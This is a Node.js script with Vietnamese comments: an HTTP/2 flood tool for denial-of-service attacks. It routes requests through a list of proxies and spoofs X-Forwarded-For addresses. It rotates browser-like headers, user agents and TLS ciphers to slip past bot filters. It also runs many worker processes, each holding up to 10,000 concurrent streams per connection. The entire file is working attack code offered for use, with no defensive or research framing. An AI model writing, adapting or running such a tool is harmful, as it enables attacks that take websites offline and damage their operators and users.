const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os'); // Để tối ưu hóa số worker

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', (err) => console.error(`[ERROR] Uncaught Exception: ${err.message}`));

if (process.argv.length < 7) {
    console.log(`Usage: node script.js target time rate threads proxyfile`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]), // Rate giờ là số request tối đa mỗi giây mỗi worker
    threads: parseInt(process.argv[5]) || os.cpus().length, // Mặc định dùng số CPU
    proxyFile: process.argv[6],
};

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/).filter(Boolean);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const ip_spoof = () => Array(4).fill().map(() => Math.floor(Math.random() * 255)).join('.');

const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];
const sigalgs1 = sig.join(':');
const cplist = [
    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
];
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
];
const lang_header = ['en-US,en;q=0.9'];
const encoding_header = ['gzip, deflate, br'];
const control_header = ['no-cache', 'max-age=0'];
const refers = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.youtube.com/',
    'https://www.linkedin.com/',
];
const uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36',
];

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.log(`[DEBUG] Starting ${args.threads} worker threads`);
    for (let counter = 0; counter < args.threads; counter++) {
        cluster.fork();
    }
} else {
    runFlooder();
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(10000); // Giảm timeout để xử lý nhanh hơn
        connection.setKeepAlive(true, 60000);

        connection.on('connect', () => {
            connection.write(Buffer.from(payload));
        });

        connection.on('data', (chunk) => {
            const response = chunk.toString('utf-8');
            const isAlive = response.includes('HTTP/1.1 200');
            if (isAlive) {
                console.log(`[DEBUG] Proxy ${options.host}:${options.port} connected`);
                callback(connection, undefined);
            } else {
                connection.destroy();
                callback(undefined, 'error: invalid response from proxy server');
            }
        });

        connection.on('timeout', () => {
            connection.destroy();
            callback(undefined, 'error: timeout exceeded');
        });

        connection.on('error', (error) => {
            connection.destroy();
            callback(undefined, `error: ${error.message}`);
        });
    }
}

const Socker = new NetSocket();

headers[":method"] = 'GET';
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + '?' + randstr(5) + '=' + randstr(25);
headers[":scheme"] = 'https';
headers['x-forwarded-proto'] = 'https';
headers['accept-language'] = randomElement(lang_header);
headers['accept-encoding'] = randomElement(encoding_header);
headers['cache-control'] = randomElement(control_header);
headers['sec-ch-ua'] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
headers['sec-ch-ua-mobile'] = '?0';
headers['sec-ch-ua-platform'] = 'Windows';
headers['upgrade-insecure-requests'] = '1';
headers['accept'] = randomElement(accept_header);
headers['user-agent'] = randomElement(uap);
headers['sec-fetch-dest'] = 'document';
headers['sec-fetch-mode'] = 'navigate';
headers['sec-fetch-site'] = 'none';
headers['TE'] = 'trailers';
headers['sec-fetch-user'] = '?1';
headers['x-requested-with'] = 'XMLHttpRequest';

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(':');
    headers['referer'] = `https://${parsedTarget.host}/?${randstr(15)}`;
    headers['origin'] = `https://${parsedTarget.host}`;
    headers['x-forwarded-for'] = ip_spoof();

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: `${parsedTarget.host}:443`,
        timeout: 10000,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error(`[ERROR] Proxy connection failed: ${error}`);
            return;
        }

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            ALPNProtocols: ['h2'],
            ciphers: randomElement(cplist),
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: 'TLSv1_3_method', // Tối ưu TLS
        };

        const tlsConn = tls.connect(tlsOptions, connection);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: 'https:',
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000, // Tăng tối đa luồng đồng thời
                initialWindowSize: 6291456, // Tăng window size
                maxFrameSize: 16384,
                enablePush: false,
            },
            maxOutstandingPings: 10000,
            createConnection: () => tlsConn,
        });

        let requestCount = 0;
        let activeRequests = 0;
        const maxRequests = 1000000; // Giới hạn request mỗi kết nối
        const startTime = Date.now();

        client.on('connect', () => {
            console.log(`[DEBUG] HTTP/2 client connected to ${parsedTarget.href}`);

            const sendRequest = () => {
                if (requestCount >= maxRequests || client.destroyed) {
                    client.destroy();
                    connection.destroy();
                    return;
                }

                if (activeRequests < 10000) { // Tăng số request đồng thời tối đa
                    activeRequests++;
                    const request = client.request(headers)
                        .on('response', () => {
                            requestCount++;
                            activeRequests--;
                            console.log(`[DEBUG] Request #${requestCount} sent (RPS: ${requestCount / ((Date.now() - startTime) / 1000) | 0})`);
                            request.close();
                            request.destroy();
                            sendRequest(); // Gửi tiếp ngay lập tức
                        })
                        .on('error', (err) => {
                            console.error(`[ERROR] Request error: ${err.message}`);
                            activeRequests--;
                            request.destroy();
                            sendRequest(); // Tiếp tục dù có lỗi
                        })
                        .end();
                }
            };

            // Bắt đầu gửi với số lượng lớn ngay lập tức
            for (let i = 0; i < Math.min(args.Rate, 10000); i++) {
                sendRequest();
            }
        });

        client.on('error', (err) => {
            console.error(`[ERROR] Client error: ${err.message}`);
            client.destroy();
            connection.destroy();
        });

        client.on('close', () => {
            connection.destroy();
        });
    });
}

setTimeout(() => {
    console.log('[DEBUG] Time’s up, stopping...');
    process.exit(0);
}, args.time * 1000);